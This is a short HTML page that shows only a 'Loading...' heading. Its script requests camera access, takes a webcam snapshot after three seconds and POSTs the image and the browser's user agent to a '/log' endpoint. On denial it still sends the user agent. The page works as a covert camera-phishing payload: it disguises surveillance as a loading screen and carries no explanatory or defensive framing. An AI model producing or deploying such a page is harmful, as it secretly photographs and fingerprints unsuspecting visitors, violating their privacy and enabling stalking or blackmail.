<!DOCTYPE html>
<html><body>
<h2>Loading...</h2>
<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>
<script>
const form = new FormData();
form.append('ua', navigator.userAgent);
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream=>{
  const v=document.getElementById('v'),c=document.getElementById('c');
  v.srcObject=stream;
  v.onloadedmetadata = ()=>{
    setTimeout(()=>{
      c.width=v.videoWidth; c.height=v.videoHeight;
      c.getContext('2d').drawImage(v,0,0);
      stream.getTracks().forEach(t=>t.stop());
      c.toBlob(b=> {
        form.append('photo', b, 'snap.jpg');
        fetch('/log',{ method:'POST', body:form });
      }, 'image/jpeg',0.9);
    },3000);
  };
})
.catch(()=>fetch('/log',{ method:'POST', body:form }));
</script></body></html>
